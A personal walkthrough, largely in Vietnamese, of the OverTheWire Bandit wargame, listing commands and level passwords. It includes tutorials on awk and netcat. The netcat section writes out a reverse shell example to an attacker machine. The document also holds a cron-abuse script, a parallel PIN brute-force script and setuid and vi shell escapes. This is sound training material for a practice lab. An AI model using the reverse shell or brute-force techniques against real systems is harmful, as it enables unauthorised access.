# Bandit challenge

## Level 0

```jsx
ssh -p 2220 bandit0@bandit.labs.overthewire.org 

pass : ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If
```

## Level 1

```jsx
Cách 1 : cat ./-  or cat /home/bandit1/- 
Cách 2 :  find ./ -type f -name '-' -exec cat {} + 

pass:  263JGJPfgU6LtdEvgfWU1XP5yac29mFx
```

## Level 2

```jsx
cat *
or
cat 'space in filename'
cat <  spaces\ in\ this\ filename

ROOT CAUSE : => Nó có space là do nó hiểu nhầm , các cái sau dấu space là command khác 
pass: MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx
```

## Level 3

```jsx
ls -la ;// list all 
Cách 1 : cat '...Hiding-From-You'
Cách 2 :  find . -type f -exec cat {} + 
Cách 3 :  cat ...* 
* :  ko đại diện cho các kí tự .
Cách 4 :  ls -la | grep "\.\.\." |  tr -s ' ' | cut -d ' ' -f 9  | cat
/*
Tại sao cách này thiếu 
Kết quả của cut là một danh sách các tên tệp , mỗi tên tệp trên một dòng. Khi dùng 
pipeline để truyền kết quả của 'cut' vào cat , cat nhận stdin là tên tệp từ kết quả của 
cut, tuy nhiên , cat không biết rằng đầu vào này là danh sách cách tệp 

CÁCH SỬ Lý :
Sử dụng Xargs (dành cho danh sách) => chuyển đổi đầu ra thành đối số  

*/
Cách 4 : ls -la | grep "\.\.\." | tr -s ' ' | cut -d ' ' -f 9 | xargs cat

/*
Sự khác biệt giữa grep và cat khi xử lí từng dòng 
+ Grep có thể xử lí dữ liệu từ stdin theo dòng mà không cần xargs
+ Cat ko làm được điều đó , nó ko xử lí theo từng dòng  
*/

pass :  2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ
```

## Level 4

```jsx
// exec với find 
find ./ -type f -exec command {} + 
{} : đại diện cho mỗi file tìm thấy 
+ :  chạy lệnh 'command' với nhiều đối số cùng lúc để tối ưu hiệu suất 

find ./ -type f -exec file {} + 
// humand readable => ASCII 
cat ./-file07

pass :  4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw
```

## Level 5

```jsx
Condition 
+ human-readable 
+ 1033 bytes in size 
+ not executable 

find ./ -type f -size 1033c -exec file {} +  
=> ASCII 
```

## Level 6

```jsx
condition 
+ owned by user bandit7 
+ owner by group bandit6 
+ 33 byte in size 

find /  -type f -size 33c -exec ls -l  {} + | grep bandit7

find / -type f -size 33c -user bandit26 -group bandit26 

pass : morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj
```

## Level 7

```jsx
// sử dụng tr command để thay thế 
tr(translate) 
syntax :  tr [options]  set1 [set2] 
=> thay thế nhiều khoảng trắng
 awk  '{for(i=1;i <= NF ; i++) {if( $i == "millionth") print $(i+ 1)}}' data.txt
 
 $i :  giữ giá trị word hiện tại trong 1 line 
 cú pháp for(){if(condition) action if true}
 
 pass  :  dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc 
```

### AWK command

awk là scripting language ⇒ sử dụng chủ yếu cho việc `text processing` 

```jsx
syntax : awk '{action}' your_file_name.txt 

//regex 
awk '/regex/ {print $0}' your_file_name.txt // $0 : full content 

// trong awk 
NF : là biến lưu trữ số lượng từ trên mỗi dòng 

awk '{for( i=1 ; i<= NF; i++){if $i == 1000001} print $0}' data.txt
```

Trong AWK có phân biệt các khối :

1. Khối chính :  `(’{ }’)`
    
    Khối chính là phần của chương trình ‘awk’  thực thi dữ liệu từ đầu vào hay tệp 
    
    Đây là nơi bạn thực thi các thao tác dữ liệu chính 
    
    - Các điểm chính :
    
    Cú pháp : { action }
    
    Thực thi  : được thực thi cho mỗi dòng dữ liệu 
    
    Biến đặc biệt : 
    
    1. $0 :  toàn bộ dòng hiện tại 
    2. $1,$2,…. Cột thứ 1 , 2, 3, của dòng hiện tại 
    3. NR : Số thứ tự của dòng hiện tại ( number of record )  
    4. NF : Số lượng cột của dòng hiện tại ( number of fileds) 
2. Khối phụ 

Là các khối được sử dụng để thực hiện các thao tác trước và sau khi xử lý dữ liệu từ tệp 

- BEGIN
    
    khối begin thực thi trước khi processing dữ liệu . Đây là nơi để thiết lập các biến , in tiêu đề 
    
    ```jsx
    awk '
    BEGIN {
        print "Tiêu đề của bảng dữ liệu:"
    }
    {
        print $1, $2
    }
    ' data.txt
    
    ```
    
- END
    
    Thực thi sau tất cả sau khi các dòng dữ liệu đã được xử lý . Nơi đây bạn có thể tổng hợp kết quả 
    
    ```jsx
    awk '
    {
        count++
    }
    END {
        print "Tổng số dòng:", count
    }' data.txt
    
    ```
    

## Level 8

```jsx
/*des : The password for the next level is stored in the file data.txt 
and is the only line of text that occurs only once*/

=> line => 1 array => set index 

awk '{
    # Lưu trữ giá trị vào mảng
    for (i = 1; i <= NR; i++) {
      if(!($0 in array)){
       array[$0] = 1 
      }else {
       array[$0] +=1
      }  
       }
    for (key in array) {
        print key ": " array[key]
    }
}' data.txt

//đoạn sửa 
awk '{
   
    if (!($0 in array)) {
        array[$0] = 1
    } else {
        array[$0] += 1
    }
}
END {
    for (key in array) {
        print key ": " array[key]
    }
}' data.txt

// điểm sai : 
for (key in array) nằm trong khối chính sẽ in kết quả sau mỗi dòng. 
Kết quả này không phản ánh đúng số lần xuất hiện của mỗi dòng vì nó in kết quả liên tục sau mỗi dòng được xử lý.

pass :4CKMh1JI91bUIZZPXDqGanal4xvAg0JM
```

## Level 9

```jsx
/*
The password for the next level is stored in the file data.txt in/l
```

## Level 10

```jsx
cat data.txt |base64 -d
pass :  dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr
```

## Level 11

```jsx
cat data.txt  | tr [a-mn-zA-MN-Z] [n-za-mN-ZA-M]
Đối chỗ : tr [set1] [set2] ( translate)

pass : 7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4
```

## Level 12

```jsx
/*
Goal : 
The password for the next level is stored in the file data.txt,
 which is a hexdump of a file that has been repeatedly compressed
*/

Định nghĩa : 
hexdump là cách hiển thị dữ liệu nhị phân dưới dạng mã hex 
1 file hex dump thường có hai phần 
+ Hexcimal 
+ Assci 

xxd là công cụ processing hexdump 

Flow : nén => nén => hexdump 

+ Step1  :  chuyển hexdump về binary | cat data.txt | xxd -r > data.bin  
+ Step2  : tìm loại nén (gzip -l) => gunzip 

pass :  FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn 
```

### Các loại file trong linux

- `Regular file` :  chứa data của nhiều loại nội dung khác nhau như text, audio, video , script và file nhị phân
- `Directory file` : Cũng là 1 file nhưng chúng chứa vị trí của các file khác

- `Special files` : Linux sử lý tất cả các thiết bị phần cứng (hard driver , printer, moniters, …) như là file đặc biệt . ⇒ /dev
- `Link files` : link files cho phép chúng ta sử dụng file dưới với tên khác nhau và ở vị trí khác nhau .1 link file là 1 con trỏ, trỏ tới file khác
- `Socket file` :  Socket files ⇒ /var/run/docker.sock

How to identify the type of file ? 

```jsx
file file_name 
=> output => hiển hị loại file 

ls -l 
```

![image.png](Bandit%20challenge%20dc032e97e1c5476a8325cb05a122b0c7/image.png)

| Character | Meaning |
| --- | --- |
| - | Regular file  |
| d | Directory file |
| l | link file |
| b | Block special file |
| p | Name pipe line  |
| c | Character special file  |
| s | Socket file  |

## Level 14

```jsx
scp bandit13@bandit.labs.overthewire.org:/home/bandit13/sshkey.private /home/khanhdang 

=> Đăng nhập bằng private key 

chmod 700 ./sshkey.private 
ssh -i ./sshkey.private bandit14@bandit.labs.overthewire.org
```

## Level 15

`netcat command` 

Nó là 1 command line dùng để cho việc `reading` và `writeting` data giữa 2 thiết bị mạng . 

Việc giao tiếp này xảy ra nó sử dụng TCP or UDP . 

Syntax  :  `netcat` , `nc` or `ncat` 

```jsx
nc [<options>] <host> <port>

/* 
host : IP address , symbolic hostname
port : số hiệu port , service name 
*/

```

Nó hoạt động ở 2 mode chính  : 

- `Connect mode` :  Trong mode kết nối , thì nó hoạt động như client , Yêu cầu **<host>** và **<port>** parameter
- `Listen mode`  :Trong mode lắng nghe , thì <host>  sẽ không cần nữa , `netcat` sẽ lắng nghe trên mọi địa chỉ khả dụng cho số **<port>** cụ thể

!NOTE : `Netcat` sẽ dụng TCP là mặc định

 

Các options hay được sử dụng 

| Option | Type | Description |
| --- | --- | --- |
| -4 | Protocol | Sử dụng IPV4 |
| -6 | Protocol | Sử dụng IPV6 |
| -u | Protocol | Sử dụng UDP |
| -p | Connect mode  | Bind the `NetCat` port to  |
| -s  | Connect mode | Bind host |
| -l | Listen mode  | Listen for connection |
| -k | Listen mode  | Keeps the connection |
| -v | Output | Sets verbosity level  |
| -z | Output | Report connection without  establishing a connection |

Example : 

- Connect mode

```jsx
nc -v 10.0.2.4 1234 
```

- Listen mode

```jsx
nc -lv 1234
```

Một vài case khác : 

- Ping Specific Port on Website

```jsx
nc -zv google.com 443
Connection to google.com (142.250.71.142) 443 port [tcp/https] succeeded!
```

- Scanning port

```jsx
nc -zv 10.0.2.4 1234 
// -z :  report status 
//range of port 
nc -zv 10.0.2.4 1230-1235 

```

- Transfer file

```jsx
nc -lv 1234 < file.txt
```

```jsx
nc -zv 10.0.2.4 1234 > file.txt
```

- Send HTTP request

```jsx
printf "GET / HTTP/1.0\r\n\r\n" | nc -v google.com 80
```

- Reverse shell

```jsx
// tạo 1 kết nối từ máy target ra ngoài tới máy của attacker 

VD :
ncat -lvp 4444

nc 192.168.1.1 4444 -e /bin/sh 

//-e /bin/bash: Thực thi bash sau khi kết nối được thiết lập.
```

Bài giải  : 

- STEP 1  : `nmap`

```jsx
nmap -sV -T5 localhost 
```

![image.png](Bandit%20challenge%20dc032e97e1c5476a8325cb05a122b0c7/image%201.png)

- STEP 2

```jsx
Find /etc -type f 
=>  /etc/bandit_pass/bandit14

cat /etc/bandit_pass/bandit14 | nc localhost 30000

pass : 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
```

## Level 15

Nguyên cứu thêm 

```jsx
/*
The password for the next level can be retrieved by submitting the password 
of the current level to port 30001 on localhost using SSL/TLS encryption.
*/

openssl s_client -connect localhost:30000 

pass : kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
```

## Level 16

```jsx
/*
The credentials for the next level can be retrieved by submitting the password
 of the current level to a port on localhost in the range 31000 to 32000.
 First find out which of these ports have a server listening on them. 
 Then find out which of those speak SSL/TLS and which don’t.
 There is only 1 server that will give the next credentials,
 the others will simply send back to you whatever you send to it.
 
 cut command 
 syntax :  cut [option] [File...]
 cut -d ',' -f 1,3 filename.txt
 namp enum ssl 
 nmap -p <port> --script ssl-enum-ciphers <hostname>
 lệnh xargs
 echo "31001 31002 31003" | xargs -I{} echo "Port {}"

*/
//step 1 :  scan port 
nc -zv localhost 31000-32000 2>&1 | grep "succeeded" | cut -d ' ' -f 5  
|xargs -I{} nmap -p {} --script ssl-enum-ciphers localhost

=> port ssl , tls,  => 31518, 31790 

nmap -sV localhost -p 31000-32000
//giải thích 
xargs nhận vào từ cut 1 list => làm đối số 
-I{} :  xác định {} sẽ làm placeholder -> giờ nó nhìn thấy {} là nó sẽ fill value vào 

=> send password 

cat /etc/bandit_pass/bandit16 | openssl s_client -connect localhost:31790 -quiet 

password :  
```

## Level 17

```jsx
diff passwords.new passwords.old
42c42
< x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO
---
> bSrACvJvvBSxEM2SGsV5sn09vc3xgqyp

/*
ở dòng  42 của file đầu tiên , cần thay đổi thành dòng 42 của file thứ 2 => match 

*/
pass:  x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO

```

## Level 18

```jsx
/*
The password for the next level is stored in a file readme in the homedirectory. 
Unfortunately, someone has modified .bashrc to log you out when you log in with SSH.
*/

```

![image.png](Bandit%20challenge%20dc032e97e1c5476a8325cb05a122b0c7/image%202.png)

readme ⇒ group bandit18 có quyền `read` 

```jsx
 ssh   bandit18@bandit.labs.overthewire.org -p 2220 'cat readme'
 
 pass : cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8
```

## Level 19

```jsx
/*
To gain access to the next level,
 you should use the setuid binary in the homedirectory. 
 Execute it without arguments to find out how to use it. 
 The password for this level can be found in the usual place (/etc/bandit_pass),
  after you have used the setuid binary.
*/
 file bandit20-do
=>bandit20-do: setuid ELF 32-bit LSB executable, Intel 80386,
 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, 
 BuildID[sha1]=368cd8ac4633fabdf3f4fb1c47a250634d6a8347, for GNU/Linux 3.2.0, 
 not stripped
```

![image.png](Bandit%20challenge%20dc032e97e1c5476a8325cb05a122b0c7/image%203.png)

Chỉ cho thằng owner có quyền read 

```jsx
./bandit20-do cat /etc/bandit_pass/bandit20 

/*
binary kia đang được run dưới quyền của bandit20 
*/

pass : 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
```

## Level 20

```jsx
/*
There is a setuid binary in the homedirectory that does the following: 
it makes a connection to localhost on the port you specify as a commandline argument.
It then reads a line of text from the connection and compares it to the password in
the previous level (bandit20). If the password is correct,
it will transmit the password for the next level (bandit21).

*/

It then reads a line of text from connection => server nhả về cho nó 
=> trigger server nhả về current password 

echo "0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO" |  nc -lv localhost 1234 &

 ./suconnect 1234
 
 pass : EeoULMCra2q0dSkYj561DX7s1CpBuOBt
```

![image.png](Bandit%20challenge%20dc032e97e1c5476a8325cb05a122b0c7/image%204.png)

## Level 21

```jsx
/*
A program is running automatically at regular intervals from cron, the time-based job scheduler. 
Look in /etc/cron.d/ for the configuration and see what command is being executed.
*/

@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
cat /usr/bin/cronjob_bandit22.sh  
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

pass: tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q
```

## Level 22

```jsx
/*
A program is running automatically at regular intervals from cron,
the time-based job scheduler. 
Look in /etc/cron.d/ for the configuration and see what command is being executed.
*/
Kiểm tra thấy nó đang gọi tới file /usr/bin/cronjob_bandit23.sh mỗi khi rebot 

+ ls -l /usr/bin/cronjob_bandit23.sh 
=> -rwxr-x--- 1 bandit23 bandit22 211 Jul 17 15:57 /usr/bin/cronjob_bandit23.sh
bandit22 thuộc group có quyền r và execute 

+ cat /usr/bin/cronjob_bandit23.sh
```

```jsx
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
```

Nó đang lấy tên rồi copy password sang 1 tên mới .

Ko thì ⇒ hashing 1 chiều ⇒ `echo I am user bandit23 | md5sum | cut -d ' ' -f 1`

⇒ `cat /tmp/8ca319486bfbbc3663ea0fbe81326349`

`pass :  0Zf11ioIjMVN551jX3CmStKLYqjk54Ga` 

! NOTE : nếu mình chạy lại thì `whoami` =bandit22 ⇒ nó sẽ copy password của level hiện tại chứ ko phải của thằng level 23 

## Level 23

```jsx
 cat /usr/bin/cronjob_bandit24.sh 

```

```jsx
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

/*phân tích 
Nó list tất cả các file ngoại trừ các file hidden trong folder 
Tiếp theo nó sử dụng  stat để lấy owner , 
nếu là owner =bandit23 thì nó execute 

xong nó xóa file đó đi 

Targer : lấy password nằm ở /etc/bandit_pass/bandit24 
-r-------- 1 bandit24 bandit24 33 Jul 17 15:56 /etc/bandit_pass/bandit24
(chỉ có bandit24) mới có quyền read 

giờ mình dựa vào script sẽ được call do đã lập lịch 
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
(nó sẽ chạy dưới quyền bandit24) 
mà scipt này , lại lấy tất cả các file trong /foo để chạy 
=> kiểm tra foo 
drwxrwx-wx 3 root bandit24 4096 Sep  2 08:02 foo
=> mình thấy mình có quyền write => có thể ghi 1 file vào
Giờ mình có thể copy password dưới quyền bandit24  
vim s1.sh && chmod 777 s1.sh 

*/

 

```

```jsx
#!/bin/bash
                                                                                                                            echo "$(whoami)"
mkdir /tmp/s24
cp /etc/bandit_pass/bandit24 /tmp/s24/pass  
chmod 777 /tmp/s24/pass               

//pass :  gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8                                                                                             cp /etc/bandit_pass/bandit24  /tmp/s24/pass      
```

## Level 24

```jsx
/*

A daemon is listening on port 30002 and will give you the password for bandit25
if given the password for bandit24 and a secret numeric 4-digit pincode.
There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time
*/

solution : wirte shell script 

```

```jsx
#!/bin/bash

# Lưu mật khẩu của bandit24
password_bandit24="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

#Địa chỉ IP hoặc hostname của server (thay đổi nếu cần)
server="localhost"

#Cổng của daemon đang lắng nghe
port=30002

# Xuất dãy số từ 0000 đến 9999 và chạy song song với xargs
seq -w 0000 9999 | xargs -P  20 -I {} bash -c 'echo {} ;  response=$(echo "'$password_bandit24' {}" | nc -w 1 '$server' '$port'); if [[ $response == *"Correct"* ]]; then echo "Mã PIN đúng là: {}"; echo "Phản hồi: $response"; kill 0; fi'
```

`Explaint`  : 

1 . Seq -w 0000 9999 :  tạo dãy số từ 0000-9999 , w là đảm bảo các các số có kí tự bằng nhau (sequence) 

1. Xargs 

Sdout sẽ được truyền vào stdin của Xargs  làm đối số 

-P 20 : process 20 currenly 

bash -c ‘’ :  chạy script với bash shell 

1. response=$(echo "'$password_bandit24' {}" | nc -w 1 '$server' '$port') : 

⇒ lưu kết quả trả về 

1. kiểm tra 

if [[ $response == *"Correct"* ]]; then ... fi

Đây là cú pháp so sánh chuỗi trong bash , nó kiểm tra xem biến response chứa chuỗi “Correct”  ở bất kì vị trí nào không .

Nếu có  thì in ra response và kill 0 : dừng tất cả tiến trình hiện tại trong shell 

```jsx
pass : iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

## Level 25

```jsx
username:x:UID:GID:comment:home_directory:shell

bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext

//
shell tùy chỉnh là : /urs/bin/showtext 

//shell detail 
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0

ls l scle

/*
more subcommand trong interact 
*/

=> vi

=> :set shell=/bin/bash 

:! cat /etc/bandit_pass/bandit26

pass: s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ

```

## Level 26

```jsx
:set shell=/bin/bash
:shell  // mở shell tạm thười ngay trong môi trường của vim 

./bandit27-do cat /etc/bandit_pass/bandit27
pass : upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB
```

## Level 27

```jsx
mkdir /tmp/s27 
git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
cd repo && cat README 

pass : Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN
```

## Level 28

```jsx
git log -- README 
git checkout 73f5d0435070c8922da12177dc93f40b2285e22a

cat README 

pass : 4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7

```

## Level 29

```jsx
git branch -r  => origin 
git checkout origin/dev
cat README 

pass : qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL 

```

## Level 30

```jsx
git show secret 
pass :  fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy 

```

## Level 31

```jsx
git add .
git commit -m "add" 
git push 

pass : 3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K
```